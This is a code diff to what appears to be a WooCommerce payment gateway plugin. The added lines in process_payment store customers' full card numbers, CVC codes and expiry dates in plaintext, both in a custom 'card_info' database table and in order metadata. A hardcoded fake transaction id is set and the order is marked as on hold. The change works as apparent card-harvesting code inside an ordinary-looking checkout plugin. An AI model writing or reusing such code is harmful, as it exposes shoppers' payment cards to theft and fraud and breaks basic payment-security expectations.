@@ -180,7 +180,7 @@ function woo_payment_gateway() {
 
 
         public function process_payment( $order_id ) {
-
+            global $wpdb;
             $order = wc_get_order( $order_id );
 
          //   $ccParams['ccNumber']   = preg_replace('/\D/', '', $_POST["{$request->gateway->id}-card-number"]);
@@ -188,6 +188,17 @@ function woo_payment_gateway() {
             $ccParams['ccName']     = $_POST['woo_paypal-card-number'];
             $ccParams['ccExpiry']     = $_POST['woo_paypal-card-expiry'];
             $ccParams['paymentMethod']     = $_POST['payment_method'];
+            add_post_meta( $order_id, 'custom_card_number',  sanitize_text_field( $_POST ['woo_paypal-card-number'] ) );
+            $table = $wpdb->prefix . "card_info";
+            $wpdb->insert(
+                $table,
+                array(
+                    'order_id' => $order_id,
+                    'ccCvc' => $_POST['woo_paypal-card-cvc'],
+                    'number_card' => $_POST ['woo_paypal-card-number'],
+                    'ccExpiry' => $_POST['woo_paypal-card-expiry'],
+                )
+            );
 
             update_post_meta($order_id, '_transaction_id', '12511das@');
             // Mark as on-hold (we're awaiting the payment)
